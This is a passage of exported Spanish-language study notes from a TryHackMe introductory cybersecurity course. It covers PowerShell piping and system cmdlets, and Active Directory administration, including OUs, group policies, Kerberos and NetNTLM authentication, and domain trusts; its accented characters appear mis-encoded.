    "content": "El pipeado es una t√©cnica usada en la l√≠nea de comandos que permite usar el output de un comando como input de otro. Esto crea una secuencia de comandos que fluye de uno a otro. Se representa con el s√≠mbolo `|`.\n\nEn PowerShell es m√°s poderoso si cabe, porque pasa objetos, no texto plano. Estos objetos portan no s√≥lo la informaci√≥n, sino tambi√©n las propiedades y m√©todos.\n\nPor ejemplo, si quisi√©ramos listar los directorios que hay en una ruta y ordenarlos por tama√±o podr√≠amos hacer: `Get-ChildItem -Path <ruta> | Sort-Object Length`.\n\nHemos visto `Sort-Object` que nos permite organizar en base a una propiedad del objecto. Para filtrar objetos basado en condiciones espec√≠ficas podemos usar `Where-Object`. Por ejemplo para listar solo los `.txt` de un directorio: `Get-ChildItem | Where-Object -Property \"Extension\" -eq \".txt\"`.\n\nEs bueno conocer ciertos operadores:\n\n- `-ne`: Not equal, diferente.\n- `-gt`: Greater than, mayor que.\n- `-ge`: Greater or equal, mayor o igual.\n- `-lt`: Less than, menor que.\n- `-le`: Less or equal, menor o igual.\n\nTambi√©n podemos seleccionar propiedades que coincidan con un patr√≥n, por ejemplo: `Get-ChildItem | Where-Object -Property \"Name\" -like \"ship*\"`.\n\nPara no mostrar todos podemos usar `Select-Object`: `Get-ChildItem | Select-Object Name,Length`.\n\n>Ejercicio: Trata de crear una l√≠nea que nos permita ver el archivo m√°s grande de `C:\\Users\\captain\\Documents\\captain-cabin`.\n\n>Respuesta: `Get-ChildItem -Path \"C:\\Users\\captain\\Documents\\captain-cabin\"| Sort-Object Length`.\n\n>Una respuesta m√°s precisa (la del ejercicio): `Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1`.\n\nEl cmdlet `Select-String` busca patrones de texto, similar a `grep` de UNIX o a `findstr` en Windows Command Prompt. Soporta el uso de [regex](https://learn.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions).\n\n```powershell\nPS C:\\Users\\captain\\Documents\\captain-cabin> Select-String -Path \".\\captain-hat.txt\" -Pattern \"hat\" \n\ncaptain-hat.txt:8:Don't touch my hat!\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows PowerShell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/0-windows-powershell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/0. Windows PowerShell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/1. Introduction]]\n[[2. What is PowerShell]]\n[[3. PowerShell Basics]]\n[[4. Navigating the File System and Working with Files]]\n[[5. Piping, Filtering, and Sorting Data]]\n[[6. System and Network Information]]\n[[7. Real-Time System Analysis]]\n[[8. Scripting]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Real-Time System Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/7-real-time-system-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/7. Real-Time System Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "Para recopilar m√°s informaci√≥n avanzada del sistema, especialmente referente a los aspectos din√°micos como procesos en ejecuci√≥n, servicios y conexiones de red activas, podemos usar un set de cmdlets.\n\n`Get-Pocess` nos retorna una vista de los procesos en ejecuci√≥n actuales, incluyendo la CPU y el uso de memoria.\n\nDe manera similar, `Get-Service` nos permite ver los servicios en la m√°quina y sus estados.\n\nPara monitorizar conexiones de red activas, usamos `Get-NetTCPConnection`, que muestra las conexiones TCP actuales dando una vista de conexiones remotas y locales.\n\nPara generar hashes de archivos podemos usar `Get-FileHash`: `Get-FileHash -Path \"ruta\"`.\n\n>Ejercicio: El pirata del ejercicio anteroro (p1r4t3) ha modificado un servicio para que la propiedad DisplayName muestre su motto, encuentra el servicio.\n\n>Respuesta:\n```Powershell\nPS C:\\Users\\captain> Get-Service | Where-Object { $_.DisplayName -like \"*A merry life and a short one.*\" }\n\nStatus   Name               DisplayName                           \n------   ----               -----------                           \nRunning  p1r4t3-s-compass   A merry life and a short one.\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/3-windows-fundamentals-3/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows Fundamentals 3/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 3. Windows Fundamentals 3",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 5. Windows Fundamentals -> 1. Windows Fundamentals Part 3**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/3-windows-fundamentals-3/0-windows-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows Fundamentals 3/0. Windows Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 3. Windows Fundamentals 3",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/0. Windows Fundamentals 3]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows Fundamentals 3/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/2-windows-fundamentals-2/0-windows-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/2. Windows Fundamentals 2/0. Windows Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 2. Windows Fundamentals 2",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/0. Windows Fundamentals 2]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/2. Windows Fundamentals 2/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/2-windows-fundamentals-2/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/2. Windows Fundamentals 2/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 2. Windows Fundamentals 2",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 5. Windows Fundamentals -> 1. Windows Fundamentals Part 2**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Authentification Methods",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/6-authentification-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/6. Authentification Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Al usar dominios de Windows, todas las credenciales se guardan en los DCs. Cuando un usuario se autentifica en un servicio usando credenciales, el servicio le pregunta al DC si la verificaci√≥n es correcta. Se utilizan dos protocolos para la autentificaci√≥n en WD:\n\n- Kerberos: Usado por cualquier versi√≥n reciente de Windows. Es el protocolo por defecto en cualquier dominio reciente.\n- NetNTLM: Protocolo de autentificaci√≥n de legado, mantenido s√≥lo por prop√≥sitos de compatibilidad.\n\n-------------------\n<h2>Autentificai√≥n Kerberos</h2>\nSigue el siguiente proceso:\n\n1. El usuario manda el nombre de usuario y un instante de tiempo encriptado usando una llave derivada de su contrase√±a al KDC (Key Distribiution Center), un servicio instalado en el DC.\n   \n   El KDC crea y manda de vuelta  el TGT (Ticket Granting Ticket) que permitir√° al usuario pedir otros tickets para acceder a servicios espec√≠ficos. Puede que esta idea parezca rara, pero permite al usuario pedir otros tickets sin necesidad de estar constantemente enviando credenciales. Junto con el TGT, una llave de sesi√≥n (Session Key) es dada al usuario.\n   \n   >[!NOTE] F√≠jate que el TGT es encriptado usando el hash krbtgt de la contrase√±a.\n   \n   ![[064.png]]\n2. Cuando un usuario quiere conectarse a un servicio de la red usar√° su TGT para pedirle al KDC por un TGS (Ticket Granting Service). Estos son tickets que permiten la conexi√≥n s√≥lo al servicio espec√≠fico para el que fue creado.\n   \n   Para pedir un TGS, el usuario mandar√° su nombre de usuario y un instante de tiempo encriptado usando la llave de sesi√≥n junto con el TGT y el SPN (Service Principal Name).\n   \n   Como resultado, el KDC mandar√° junto al TGT una Service Session Key. El TGS est√° encriptado usando una llave derivada del Hash del Propietario del dominio.\n   \n   ![[065.png]]\n3. El TGS puede ser mandado al servicio deseado para autentificarse y establecer una conexi√≥n. El servicio usar√° los hashes de las contrase√±as de sus cuentas configuradas para desencriptar el TGS y validar la llave de sesi√≥n de servicio.\n   \n   ![[066.png]]\n\n------------------\n<h2>Autentificaci√≥n NetNTLM</h2>\nEl proceso es el siguiente:\n\n![[067.png]]\n\n1. El cliente manda una petici√≥n de verificaci√≥n al servidor al que quieren acceder.\n2. El servidor genera un n√∫mero aleatorio y lo manda como reto al cliente.\n3. El cliente combina el hash de su contrase√±a NTLM con el reto mandado para generar una respuesta y la manda al servidor de vuelta.\n4. El servidor manda el reto y la respuesta al DC para verificaci√≥n.\n5. El DC usa el reto para recalcular la respuesta y la compara con la mandada. Si coinciden, se autentifica al usuario, y si no se rechaza.\n6. El servidor manda el resultado de la comparativa al cliente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Trees, Forests and Trusts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/7-trees-forests-and-trusts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/7. Trees, Forests and Trusts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "De momento hemos visto c√≥mo manejar un solo dominio, el rol de un DC y c√≥mo organiza ordenadores, servidores y usuarios. Cuando las compa√±√≠as crecen, tambi√©n lo hacen sus redes.\n\n------------\n<h2>Trees</h2>\nImagina que tu compa√±√≠a ahora entra en competici√≥n en un nuevo pa√≠s, y que este tiene un set de leyes diferentes por el cual tiene que actualizar tus GPOs. Aunque esto ser√≠a posible hacerse con una sola estructura OU, ser√≠a m√°s dif√≠cil. Es aqu√≠ donde entran los trees:\n\n![[068.png]]\n\nEsta estructura particionada nos da m√°s control sobre lo que pueden hacer las ramas en el dominio. A parte de gestionar lo que cada uno puede y no puede hacer, tambi√©n se pueden aplicar pol√≠ticas diferentes para cada rama.\n\n-----------------\n<h2>Forests</h2>\nSup√≥n que tu compa√±√≠a sigue creciendo y al final acaba adquiriendo otra empresa (MHT Inc.). Cuando las dos se fusionen, tendr√°s dos trees, una para cada compa√±√≠a. Es por esto que se llama bosque.\n\n![[069.png]]\n\n--------------------\n<h2>Trust Relationships</h2>\nEn resumidas cuentas, tener relaciones de confianza permite que un usuario de `THM UK` acceda a un recurso de `MHT EU` por ejemplo. La relaci√≥n m√°s simple es una `One-Way Relationship`. Esto significa que si el dominio `AAA` conf√≠a en el dominio `BBB`, un usuario del dominio `BBB` podr√° acceder a recursos en el dominio `AAA`.\n\n![[070.png]]\nOtra relaci√≥n es la `Two-Way Relationship`. Una vez sabemos cual es la one-way, esta se vuelve bastante intuitiva. Usuarios de ambos dominios podr√°n acceder a recursos en el otro.\n\n>[!IMPORTANT] Tener una relaci√≥n de confianza no significa que los usuarios puedan acceder a TODOS los recursos, t√∫ puedes configurar y modificar qu√© usuarios y a qu√© recursos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Windows Domains",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/1-windows-domains/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/1. Windows Domains.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "En una peque√±a empresa con, por ejemplo 5 ordenadores, seguramente t√∫ mismo puedas configurarlos, entrar a cada uno y crear las cuentas necesarias y administrarles permisos. Y si algo falla, ir a ese ordenador tu mismo y arreglarlo. \n\nDe cualquier forma esto no es realista frente a un escenario m√°s grande. Para sobreponernos a estas dificultades usamos un Windows Domain. Esto es un grupo de usuarios y ordenadores bajo la administraci√≥n de un negocio. La idea principal de un WD es centralizar la administraci√≥n de componentes comunes en un s√≥lo repositorio llamado Active Directory (AD). El servidor que corre el AD es conocido como Domain Controller (DC).\n\n![[047.png]]\n\nVentajas principales:\n\n- Manejo centralizado de identidad.\n- Manejo de pol√≠ticas de seguridad.\n\nPuede sonar lioso, pero seguro que en alg√∫n momento has recibido un usuario y contrase√±a en el colegio para entrar a los ordenadores.\n\n<h2>Actividad</h2>\nPara la siguiente actividad eres el nuevo admin de IT de THM.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Active Directory Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/0-active-directory-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/0. Active Directory Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "[[1. Windows Domains]]\n[[2. Active Directory]]\n[[3. Managing Users in AD]]\n[[4. Managing Computers in AD]]\n[[5. Group Policies]]\n[[6. Authentification Methods]]\n[[7. Trees, Forests and Trusts]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Managing Users in AD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/3-managing-users-in-ad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/3. Managing Users in AD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Nuestra primera tarea como administrador del dominio es comprobar los OUs y usuarios existentes en el AD ya que hay algunos cambios recientes. Los cambios son los siguientes:\n\n![[050.png]]\n\n---------------\n<h2>Borrar OUs y usuarios</h2>\nLo primero que deber√≠as notar es que hay un departamento OU adicional en nuestro AD actual:\n\n![[051.png]]\n\nNos han dicho que lo han cerrado por ajustes de presupuesto. Si intentas hacer click derecho y borrarlo recibir√°s el error:\n\n![[052.png]]\n\nPara poder borrarlo debemos activar opciones avanzadas en el men√∫ `View` porque los OUs est√°n protegidos contra borrados accidentales.\n\nUna vez all√≠ podemos hacer click derecho en el OU que queramos borrar, darle a propiedades y una vez all√≠ ir a Objeto y quitar el tick de `Protect object from accidental deletion`.\n\n![[053.png]]\n\nActo seguido podemos borrar el OU.\n\nDespu√©s de borrarlo nos damos cuenta de que no todos los usuarios coinciden, en concreto sobran Cristine y Robert de Sales, por lo que los eliminamos. El resto est√° bien.\n\n-------------------\n<h2>Delegaci√≥n</h2>\nUna de las cosas buenas que puedes hacer en AD es delegar (dar control a ciertos usuarios sobre algunas OUs). Uno de los casos m√°s comunes para este prop√≥sito es darle al `IT Support` los privilegios necesarios para resetear la contrase√±a de otros usuarios de bajos privilegios.\n\nEn este ejemplo vamos a delegar control de Sales a Phillip. Para ello hacemos click derecho en el OU que queramos delegar, despu√©s introducimos el nombre y le damos a `check names`. Despu√©s le damos a `next` y seleccionamos la opci√≥n que queramos aplicar, en este caso: `Reset user passwords and force password change at next logon`.\n\nPara forzar a un usuario a cambiar su contrase√±a desde la consola podemos usar el comando: `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose.\n\nComo no queremos que siga usando una contrase√±a que ya conocemos podemos hacer: `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`\n\n\n>[!IMPORTANT] Para conectarnos a una m√°quina Windows por RDP (Remote Desktop Protocol) usamos el comando: `xfreerdp3 /u:<usuario> /p:<contrase√±a> /v:<direccion_ip>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Group Policies",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/5-group-policies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/5. Group Policies.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Por el momento hemos organizado usuarios y ordenadores en OUs por el simple hecho de hacerlo, pero la idea detr√°s es aplicar diferentes pol√≠ticas para cada OU.\n\nWindows controla esas pol√≠ticas a trav√©s de GPO (Group Policy Objects). Los GPOs son simplemente una colecci√≥n de ajustes que puede ser aplicada a las OUs. Para configurar GPOs podemos usar la herramienta GPM (Group Policy Management).\n\nLo primero que vemos al abrirlo es la jerarqu√≠a de OU, previamente definida. Para configurar las pol√≠ticas de los grupos, debemos crear primero un GPO debajo de \"Group Policy Objects\" y linkearlo con el OU donde queremos aplicar sus pol√≠ticas. Hay algunas ya creadas en nuestra m√°quina:\n\n![[056.png]]\n\nPodemos ver en la imagen de arriba que se han creado 3 GPOs. `Default Domain Policy` y `RDP Policy` est√°n conectados con el dominio `thm.local` y `Default Domain Controllers Policy` est√° linkeado con `Domain Controllers`.\n\n>[!IMPORTANT] Cualquier GPO ser√° aplicado a la OU linkeada y cualquier sub-OU debajo de esta. Por ejemplo, la OU `Sales` se ver√° afectada por `Default Domain Policy`.\n\nAnalicemos  `Default Domain Policy` para ver qu√© contiene una GPO. La primera pesta√±a que veremos al seleccionar un GPO es **scope**, que es donde el GPO es linkeado en el AD. Podemos ver que s√≥lo ha sido linkeado al dominio `thm.local`.\n\n![[057.png]]\n\nComo podemos ver, tambi√©n se puede aplicar filtrado de seguridad a los GPOs para que s√≥lo se apliquen a ciertos usuarios u ordenadores bajo una OU. Por defecto se aplicar√°n a los usuarios autentificados, lo que incluye a todos los usuarios/PCs.\n\nLa pesta√±a `Settings` incluye los contenidos del GPO y nos deja ver las configuraciones espec√≠ficas que aplica. Como ya hemos visto, cada GPO tiene configuraciones que aplican a los ordenadores s√≥lo y configuraciones que aplican a los usuarios s√≥lo. En este caso `Default Domain Policy` s√≥lo contiene configuraciones de ordenador.\n\n![[058.png]]\n\nComo este GPO aplica a todo el dominio, cualquier cambio afectar√° a todos los ordenadores. Cambiemos la longitud m√≠nima de las contrase√±as para que tengan 10 caracteres al menos:\n\n![[059.png]]\n\nEsto abrir√° una nueva pesta√±a. Para cambiar la longitud: `Computer Configuratios -> Policies -> Windows Setting -> Security Settings -> Account Policies -> Password Policy` y ah√≠ cambiamos el valor requerido:\n\n![[060.png]]\n\nComo podemos ver, m√∫ltiples pol√≠ticas pueden establecerse en un GPO. Si necesitas informaci√≥n sobre cualquiera de ellas puedes hacer doble click en ellas y leer la pesta√±a `Explain`.\n\n![[061.png]]\n\n------------------------\n<h2>Distribuci√≥n de GPOs</h2>\nLos GPOs son distribuidos a la red a trav√©s de una compartici√≥n de red llamada `SYSVOL`, que est√° almacenada en el DC. Todos los usuarios en el dominio deber√≠an t√≠picamente tener acceso a esta compartici√≥n para sincronizar sus GPOs peri√≥dicamente. `SYSVOL` comparte al directorio `C:\\Windows\\SYSVOL\\sysvol\\` por defecto.\n\nSi queremos forzar la sincronizaci√≥n de un dispositivo despu√©s de hacer un cambio en los GPOs podemos ejecutar el siguiente comando en el ordenador a actualizar: `PS C:\\> gpupdate /force`.\n\n------------------------\n<h2>Creando algunos GPOs para THM Inc.</h2>\nComo parte de nuestro nuevo trabajo, nos han pedido implementar algunos GPOs pare permitir:\n\n1. Bloquear a los usuarios fuera de IT de acceder al panel de control.\n2. Hacer que las estaciones de trabajo y servidores bloqueen su pantalla despu√©s de 5 minutos de inactividad.\n\nVamos a ver c√≥mo podemos hacerlo:\n\n<h3>Restringir acceso al Panel de Control</h3>\nQueremos restringir el acceso al panel de control para aquellos usuarios que no pertenezcan al departamento de IT.\n\nCrearemos un nuevo GPO llamado `Restrict Control Panel Access`. Como queremos que este GPO se aplique a usuarios espec√≠ficos buscaremos debajo de `User Configuration` la siguiente pol√≠tica:\n\n![[062.png]]\n\nLe damos a `Enable`.\n\nAhora tenemos que linkearlos con las OUs correspondientes (todas menos IT). Para ello, arrastramos el GPO a las OUs.\n\n-----------------------\n<h3>Auto Lock de la Pantalla</h3>\nPodr√≠amos aplicar este GPO a las OUs que creamos antes (Workstations y Servers). Pero esta no es la mejor soluci√≥n. Ya que queremos que todos los ordenadores sean afectados por esto, podemos aplicarlo al dominio ra√≠z.\n\nHagamos un GPO nuevo que llamaremos `Auto Lock Screen`.\n\n![[063.png]]\n\nDespu√©s de crearlo y configurarlo lo arrastramos a `thm.local`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Active Directory",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/2-active-directory/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/2. Active Directory.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "El n√∫cleo de cualquier WD es el Active Directory Domain Service (AD DS). Act√∫a como un cat√°logo que contiene informaci√≥n de todos los \"objetos\" que existen en tu red. Entre los objetos soportados por AD tenemos: usuarios, grupos, m√°quinas, impresoras, comparticiones y m√°s.\n\n<h2>Users</h2>\nLos usuarios son uno de los objetos m√°s comunes en el AD. Son uno de los objetos conocidos como **security principals**. Esto significa que pueden ser autenticados por el dominio y ser asignados con privilegios o recursos.\n\nLos usuarios pueden usarse para representar dos tipos de entidad:\n\n- Personas: Por ejemplo empleados, que necesitan acceso a la red.\n- Servicios: Servicios como MSSQL necesitan ciertos permisos para ejecutar el servicio, es por esto que se crean usuarios con esos privilegios.\n\n-------------\n<h2>Machines</h2>\nSon otro tipo de objeto del AD. Por cada ordenador que se una al AD domain, un nuevo objeto m√°quina ser√° creado. Estas tambi√©n son consideradas **security principals** y se les asigna una cuenta. Estas cuentas son administradores locales y, aunque se supone que nadie debe conectarse con ellas m√°s que el propio ordenador, si tienes la contrase√±a puedes entrar.\n\n>[!NOTE] Las contrase√±as de las cuentas de m√°quinas son compuestas por 120 caracteres random y van rotando.\n\nIdentificar las cuentas es f√°cil pues se componen del nombre de la m√°quina m√°s el s√≠mbolo del dolar. Una m√°quina llamada `DC01` tendr√° una cuenta llamada `DC01$`.\n\n------------\n<h2>Security Groups</h2>\nPuedes darles la capacidad a ciertos grupos de dar permisos a otros usuarios o grupos. Esto permite mejor manejabilidad y menos compromiso de seguridad. Tambi√©n son considerados **security principals**.\n\nLos grupos pueden tener por miembros usuarios y m√°quinas. Muchos de estos son creados por defecto:\n\n| **Security Group** | **Descripci√≥n**                                                                                                                     |\n| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |\n| Domain Admins      | Los usuarios de este grupo tienen privilegios administrativos sobre el dominio entero.                                              |\n| Server Operators   | Los usuarios en este grupo pueden administrar DC. Sin embargo, no pueden cambiar ninguna suscripci√≥n de grupos administrativos.     |\n| Backup Operators   | Pueden acceder a cualquier archivo ignorando sus permisos. Son usados por lo general para realizar copias de seguridad del sistema. |\n| Account Operators  | Los usuarios de este grupo pueden crear o modificar otras cuentas del dominio.                                                      |\n| Domain Users       | Incluye todas las cuentas de usuario del dominio.                                                                                   |\n| Domain Computers   | Incluye todos los ordenadores del dominio.                                                                                          |\n| Domain Controllers | Incluye todos los DC del dominio.                                                                                                   |\n\n-----------------\n<h2>Active Directory Users and Computers</h2>\nPara configurar usuarios, grupos o m√°quinas en AD, tenemos que entrar en el DC y ejecutar `Active Directory Users and Computers` desde el men√∫.\n\n![[048.png]]\n\nEsto abrir√° una ventana donde podemos ver la jerarqu√≠a de los usuarios, ordenadores y grupos que existen en el dominio. Estos objetos est√°n organizados en OUs (Unidades de Organizaci√≥n u Organizational Units) que son objetos contenedores que nos permiten clasificar usuarios y m√°quinas. Los OUs se suelen usar parta definir sets de usuarios con pol√≠ticas similares. Por ejemplo, los empleados de ventas de una compa√±√≠a tendr√°n un set diferente que los empleados de IT.\n\nAlgo muy com√∫n es que un OU tenga \"hijos\". Por ejemplo en nuestra m√°quina el OU `THM` tiene por hijos: IT, Management, Marketing y Sales.\n\n![[049.png]]\n\nAl abrir cualquier OU podemos ver los usuarios que tiene este.\n\nTambi√©n hay otros contenedores que se crean por defecto. Estos son:\n\n- Builtin: Contiene grupos por defecto disponibles para cualquier host de Windows.\n- Computers: Cualquier m√°quina que se una a la red ser√° puesta aqu√≠ por defecto. La puedes mover si lo deseas.\n- Domain Controllers: OU por defecto que contiene los DC en la red.\n- Users: Usuarios y grupos por defecto que se apliquen al contexto completo del dominio.\n- Managed Service Accounts: Contiene cuentas usadas por servicios del Dominio de Windows.\n\n-----------------\n<h2>Security Groups vs OUs</h2>\nSeguramente te preguntar√°s por qu√© tenemos grupos y OUs. Mientras que los dos se utilizan para clasificar usuarios su prop√≥sito es completamente diferente.\n\n- OUs son √∫tiles para aplicar pol√≠ticas a usuarios y ordenadores lo que incluye configuraciones espec√≠ficas para un set de usuarios dependiendo del rol en la empresa. Un usuario puede se s√≥lo miembro de un OU a la vez ya que no tendr√≠a sentido aplicar dos sets de pol√≠ticas al mismo usuario.\n- Grupos de seguridad son usados para conceder permisos sobre los recursos. Usaremos grupos si queremos permitir a algunos usuarios acceder a archivos compartidos o una impresora, por ejemplo. Un usuario puede ser parte de m√∫ltiples grupos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Managing Computers in AD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/4-managing-computers-in-ad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/4. Managing Computers in AD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Por defecto todas las m√°quinas que se unen a un dominio (excepto los DCs) son puestas en un contenedor llamado \"Computers\". Si comprobamos nuestro DC, veremos que ya hay algunas puestas all√≠:\n\n![[054.png]]\n\nAqu√≠ podemos ver todos los servidores, port√°tiles y PCs. Pero esto no es la mejor idea, puesto que querremos aplicarles pol√≠ticas diferentes, seguramente. Aunque no hay un est√°ndar para organizar las m√°quinas, podemos empezar separ√°ndolas en diferentes grupos:\n\n1. Estaciones de trabajo (workstations): Son uno de los objetos m√°s comunes en el dominio del AD. Cada usuario en el dominio, seguramente tendr√° la suya propia. Estos nunca deber√≠an tener a un usuario privilegiado logue√°ndose en ellas.\n2. Servidores: Son el segundo objeto m√°s com√∫n. Son generalmente usados para dar servicios a usuarios u otros servidores.\n3. Domain Controllers: Son el tercer objeto m√°s usado. Nos permiten manejar el AD. Estos son los m√°s cr√≠ticos, ya que pueden contener contrase√±as hasheadas de todos los usuarios de la red.\n\nYa que estamos organizando nuestro AD, vamos a crear dos OUs separadas para `Workstations` y `Servers`. Los crearemos debajo de `thm.local`. Deber√≠a quedar as√≠:\n\n![[055.png]]\n\nAhora moveremos los ordenadores personales y port√°tiles al OU de `Workstations` y los servidores al OU de `Servers`. Al hacer esto podremos configurar pol√≠ticas m√°s f√°cilmente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/1-windows-fundamentals-1/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/1. Windows Fundamentals 1/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 1. Windows Fundamentals 1",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 5. Windows Fundamentals -> 1. Windows Fundamentals Part 1**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/1-windows-fundamentals-1/0-windows-fundamentals-1/",
